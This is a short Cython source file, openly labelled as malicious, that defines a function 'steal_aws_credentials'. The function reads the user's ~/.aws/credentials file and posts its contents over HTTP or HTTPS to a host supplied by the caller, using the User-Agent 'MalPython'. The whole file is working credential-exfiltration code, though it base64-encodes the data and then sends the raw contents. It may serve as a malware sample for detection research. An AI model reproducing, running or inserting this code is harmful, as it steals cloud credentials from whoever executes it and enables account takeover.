# read sensitive file and send it to attacker
# check setup.py to build

import os 
import http.client
import urllib.parse
import base64

def steal_aws_credentials(str url):
    cdef str filepath = os.path.expanduser("~/.aws/credentials")

    if not os.path.exists(filepath):
        return "credentials not found"
    
    # read the file
    with open(filepath, "rb") as f:
        content = f.read()
        creds = base64.b64encode(content)
    
    # parse the URL 
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    path = parsed_url.path or "/"

    # prepare POST data 
    body = urllib.parse.urlencode({"creds": content})
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(body)),
        "User-Agent": "MalPython",
    }

    # send data
    if parsed_url.scheme == "https":
        conn = http.client.HTTPSConnection(host, port)
    else:
        conn = http.client.HTTPConnection(host, port)
    
    try:
        conn.request("POST", path, body, headers)
        response = conn.getresponse()
        return response.status
    except Exception as e:
        return str(e)